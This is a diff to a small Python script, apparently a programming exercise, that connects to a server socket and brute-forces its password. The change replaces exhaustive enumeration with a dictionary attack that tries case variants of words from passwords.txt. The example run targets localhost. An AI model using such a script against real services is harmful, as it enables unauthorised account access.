@@ -1,28 +1,22 @@
 import socket
 import argparse
 import itertools
-import string
 
 
 def bruteforce(client_socket):
-    characters = string.ascii_lowercase + string.digits
-    max_attempts = 1000000
-    try_count = 0
-    for length in range(1, len(characters)+1):
-        password_iter = itertools.product(characters, repeat=length)
-        for password in password_iter:
-            if try_count >= max_attempts:
-                return
-            data = "".join(password)
-            client_socket.send(data.encode())
+    passwords = load_passwords()
 
-            response = client_socket.recv(1024)
+    for password in passwords:
+        password_iter = map(''.join, itertools.product(*zip(password.lower(), password.upper())))
+        for pwd in password_iter:
+            client_socket.send(pwd.encode())
+            response = client_socket.recv(10240)
             response = response.decode()
 
             if response == "Connection success!":
-                print(data)
+                client_socket.close()
+                print(pwd)
                 return
-            try_count += 1
 
 def connection(hostname, port):
     with socket.socket() as client_socket:
@@ -31,7 +25,12 @@ def connection(hostname, port):
         client_socket.connect(address)
         bruteforce(client_socket)
 
+def load_passwords():
+    with open("passwords.txt", "r") as file:
+        passwords = [line.strip() for line in file]
+    return passwords
 
+# python hack.py localhost 9090
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument(
